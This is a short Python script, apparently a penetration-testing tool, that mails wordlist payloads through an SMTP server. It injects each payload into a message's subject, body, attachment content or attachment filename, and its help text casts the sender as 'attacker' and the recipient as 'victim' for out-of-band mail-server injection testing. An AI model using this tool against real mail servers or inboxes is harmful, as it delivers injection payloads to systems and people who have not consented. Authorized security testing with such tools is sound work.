### CREATED BY KARMAZ95

import smtplib,sys, getopt
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import Encoders


### OPTIONS ---
full_cmd_arguments = sys.argv
argument_list = full_cmd_arguments[1:]
short_options = "hf:t:w:s:i:"
long_options = ["help", "from", "to", "wordlist", "smtp", "inject"]
try:
        arguments, values = getopt.getopt(argument_list, short_options, long_options)
except getopt.error as err:
        sys.exit(2)
### --- (They will be iterated at the bottom of the screen ---

def inject_subject(me,you,payload,smtp_server):
    msg = MIMEMultipart()
    msg['Subject'] = '%s' % payload
    msg['From'] = me
    msg['To'] = you

    s = smtplib.SMTP(smtp_server)
    s.sendmail(me, [you], msg.as_string())
    s.quit()

def inject_body(me,you,payload,smtp_server):
    msg = MIMEMultipart()
    msg = MIMEText(payload)
    msg['Subject'] = 'OOBBODYMTAtest'
    msg['From'] = me
    msg['To'] = you
    s = smtplib.SMTP(smtp_server)
    s.sendmail(me, [you], msg.as_string())
    s.quit()

def inject_filebody(me,you,payload,smtp_server):
    msg = MIMEMultipart()
    msg['Subject'] = 'OOBFILEBODYMTAtest'
    msg['From'] = me
    msg['To'] = you
    part = MIMEBase('application', "octet-stream")
    part.set_payload(payload)
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="text.txt"')
    msg.attach(part)
    
    s = smtplib.SMTP(smtp_server)
    s.sendmail(me, [you], msg.as_string())
    s.quit()

def inject_filename(me,you,payload,smtp_server):
    msg = MIMEMultipart()
    msg['Subject'] = 'OOBFILENAMEMTAtest'
    msg['From'] = me
    msg['To'] = you
    part = MIMEBase('application', "octet-stream")
    part.set_payload("")
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"'% payload)
    msg.attach(part)
    
    s = smtplib.SMTP(smtp_server)
    s.sendmail(me, [you], msg.as_string())
    s.quit()


payloads_array = list()
for current_argument, current_value in arguments:
    if current_argument in ("-h", "--help"):
        print("USAGE: \tMTA_tester.py\n\n \t\t-h --help => Show this help \n\t\t-f --from => \"attacker@smtp.vps.com\" \n\t\t-t --to => \"victim@gmail.com\" \n\t\t-w --wordlist => oob.txt \n\t\t-s --smtp smtp.vps.com \n\t\t-i  --inject [subject,body,filename,filebody")
    elif current_argument in ("-f", "--from"):
        me = current_value
    elif current_argument in ("-t", "--to"):
        you = current_value
    elif current_argument in ("-s", "--smtp"):
        smtp_server = current_value 
    elif current_argument in ("-w", "--wordlist"):
        with open(str(current_value)) as payloads:
            for payload in payloads:
                payloads_array.append(payload.rstrip('\n'))
    elif current_argument in ("-i", "--inject"):
        if current_value == "subject":
            for payload in payloads_array:
                print(payload)
                inject_subject(me,you,payload,smtp_server)
        elif current_value == "body":
            for payload in payloads_array:
                print(payload)
                inject_body(me,you,payload,smtp_server)
        elif current_value == "filebody":
            for payload in payloads_array:
                print(payload)
                inject_filebody(me,you,payload,smtp_server)
        elif current_value == "filename":
            for payload in payloads_array:
                print(payload)
                inject_filename(me,you,payload,smtp_server)


